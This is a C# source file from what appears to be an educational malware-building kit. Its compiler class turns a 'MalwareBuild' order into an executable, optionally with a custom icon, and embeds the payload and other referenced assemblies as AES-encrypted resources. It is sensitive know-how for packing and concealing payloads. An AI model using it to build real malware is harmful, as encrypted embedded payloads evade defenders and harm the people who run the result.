using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Text;
using EducationalMalwareKit.CodeAssembly.Helpers;
using EducationalMalwareKit.CodeAssembly.Models;
using EducationalMalwareKit.CodeAssembly.Properties;
using Microsoft.CSharp;

namespace EducationalMalwareKit.CodeAssembly.Compilers
{
    public class CodeDomCompiler : ICompiler, IDisposable
    {
        private CSharpCodeProvider _compiler;

        public CompilationResult CompileExecutable(MalwareBuild assemblyOrder)
        {
            var instructions = assemblyOrder.CompilerInstructions;
            var options = new Dictionary<string, string>() { { "CompilerVersion", instructions.NetVersion } };
            _compiler = new CSharpCodeProvider(options);
            var win32Icon = "";            

            if (File.Exists(assemblyOrder.IconFilePath))
            {
                win32Icon = $" /win32icon:{assemblyOrder.IconFilePath}";
            }

            var parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                GenerateInMemory = false,
                OutputAssembly = instructions.ExecutablePath,
                MainClass = $"{instructions.EmkMainClass}",
                CompilerOptions = "/target:exe /platform:anycpu" + win32Icon,
                IncludeDebugInformation = instructions.OutputDebugFiles,               
            };

            if (instructions.OutputDebugFiles)
            {
                var generatedFilesPath = Path.Combine(assemblyOrder.OutputDirectoryPath, "debugdata");

                if (Directory.Exists(generatedFilesPath))
                {
                    Directory.Delete(generatedFilesPath, true);
                }

                Directory.CreateDirectory(generatedFilesPath);
                parameters.TempFiles = new TempFileCollection(generatedFilesPath, true);
            }

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");

            instructions.ReferencedAssembliesPaths.Add(instructions.PayloadAssembly.Location);

            var keyAsBytes = Encoding.UTF8.GetBytes(instructions.EmbeddedEncryptionKey);
            var saltAsBytes = Encoding.UTF8.GetBytes(instructions.EmbeddedEncryptionSalt);

            foreach (var assemblyLocation in instructions.ReferencedAssembliesPaths)
            {
                parameters.ReferencedAssemblies.Add(assemblyLocation);
                parameters.EmbeddedResources.Add(EncryptionHelper.AesEncryptFile(assemblyLocation, keyAsBytes, saltAsBytes));
            }

            var compilerResult = _compiler.CompileAssemblyFromSource(parameters, instructions.Code, Resources.SimpleAES);

            var result = new CompilationResult()
            {
                PathToOutput = instructions.ExecutablePath
            };

            if (compilerResult.Errors.Count <= 0)
            {
                return result;
            }

            foreach (var compilerResultError in compilerResult.Errors)
            {
                result.Errors.Add(compilerResultError.ToString());
            }

            return result;
        }

        public void Dispose()
        {
            _compiler.Dispose();
        }
    }
}
